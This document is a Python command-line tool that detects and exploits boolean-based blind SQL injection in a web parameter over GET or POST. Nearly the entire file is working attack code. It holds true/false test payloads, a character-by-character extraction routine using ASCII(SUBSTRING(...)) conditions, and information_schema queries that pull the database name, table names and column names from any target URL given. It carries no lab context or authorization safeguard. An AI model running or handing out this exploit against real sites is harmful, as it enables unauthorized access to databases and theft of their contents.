import requests
import argparse
import time

# Simple test payloads to detect SQL injection via boolean conditions
# We assume parameter is injectable via appending ' AND 1=1 -- ' or ' AND 1=2 -- '
bool_test_payloads = [
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    '" AND 1=1 -- ',
    '" AND 1=2 -- '
]

# Common SQL keywords to enumerate info for MySQL-like DBMS
queries = {
    'database': "SELECT database()",
    'tables': "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
    'columns': "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
}

def send_request(url, param, payload, method='GET', data=None):
    if method == 'GET':
        params = {param: payload}
        try:
            resp = requests.get(url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"Request failed: {e}")
            return None
    elif method == 'POST':
        post_data = data.copy() if data else {}
        post_data[param] = payload
        try:
            resp = requests.post(url, data=post_data, timeout=10)
            return resp.text
        except Exception as e:
            print(f"Request failed: {e}")
            return None
    else:
        print(f"Unsupported HTTP method: {method}")
        return None

def detect_injection(url, param, method, data):
    print("[*] Detecting SQL Injection vulnerability...")
    for true_payload in bool_test_payloads[::2]:  # True condition payloads
        false_payload = true_payload.replace("1=1", "1=2")
        true_resp = send_request(url, param, true_payload, method, data)
        false_resp = send_request(url, param, false_payload, method, data)
        if true_resp and false_resp and true_resp != false_resp:
            print(f"[+] Parameter '{param}' seems injectable with payload: {true_payload}")
            return True
    print("[-] No SQL Injection vulnerability detected.")
    return False

def blind_sqli_extract(url, param, method, data, query, max_len=30):
    print(f"[*] Extracting data for query: {query}")
    extracted = ''
    for pos in range(1, max_len + 1):
        found_char = False
        for c in range(32, 127):  # printable ASCII
            # Boolean-based blind SQL injection payload:
            # Using ASCII function: ASCII(SUBSTRING((query), pos, 1)) = c
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={c} -- "
            resp_true = send_request(url, param, payload, method, data)
            payload_false = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={c+1} -- "
            resp_false = send_request(url, param, payload_false, method, data)

            # Simple heuristic: response difference means condition true
            if resp_true and resp_false and resp_true != resp_false:
                extracted += chr(c)
                print(f"[+] Found char at pos {pos}: {chr(c)}")
                found_char = True
                break
        if not found_char:
            print("[*] Extraction complete or no matching char found.")
            break
    print(f"[+] Extracted value: {extracted}")
    return extracted

def main():
    parser = argparse.ArgumentParser(description="Basic SQL Injection Scanner & Extractor")
    parser.add_argument('url', help='Target URL (e.g., http://example.com/vuln.php)')
    parser.add_argument('param', help='Parameter name to test and exploit')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use')
    parser.add_argument('--data', help='POST data parameters (key=value&key2=value2) for POST')
    parser.add_argument('--extract-tables', action='store_true', help='Extract table names after injection detection')
    parser.add_argument('--extract-columns', metavar='TABLE', help='Extract column names for a given table')
    parser.add_argument('--max-len', type=int, default=30, help='Max length for extraction (default 30)')

    args = parser.parse_args()

    data = None
    if args.method == 'POST':
        if not args.data:
            print("[-] POST method requires --data argument")
            return
        data = {}
        for pair in args.data.split('&'):
            if '=' in pair:
                k,v = pair.split('=',1)
                data[k] = v
            else:
                data[pair] = ''

    if detect_injection(args.url, args.param, args.method, data):
        db_name = blind_sqli_extract(args.url, args.param, args.method, data, queries['database'], args.max_len)
        print(f"\nDatabase name: {db_name}")

        if args.extract_tables:
            tables = blind_sqli_extract(args.url, args.param, args.method, data, queries['tables'], args.max_len*5)
            print(f"\nTables:\n{tables}")

        if args.extract_columns:
            columns_query = queries['columns'].format(table=args.extract_columns)
            columns = blind_sqli_extract(args.url, args.param, args.method, data, columns_query, args.max_len*5)
            print(f"\nColumns in {args.extract_columns}:\n{columns}")

    else:
        print("[-] Exploitation aborted due to no injection detected.")

if __name__ == '__main__':
    main()
